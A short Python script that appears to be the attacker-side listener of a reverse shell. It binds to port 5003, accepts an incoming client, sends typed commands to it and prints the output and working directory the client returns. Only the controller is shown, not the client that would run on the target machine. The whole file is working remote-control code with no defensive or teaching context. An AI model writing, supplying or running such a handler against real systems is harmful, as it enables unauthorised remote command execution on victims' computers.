import socket

SERVER_HOST = "0.0.0.0" 
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"[*] Server listening on port {SERVER_PORT}...")

client_socket, client_address = s.accept()
print(f"[+] Client connected from: {client_address}")

cwd = client_socket.recv(BUFFER_SIZE).decode()

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    response = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = response.rsplit("\n", 1)
    if results:
        print(results)

client_socket.close()
s.close()

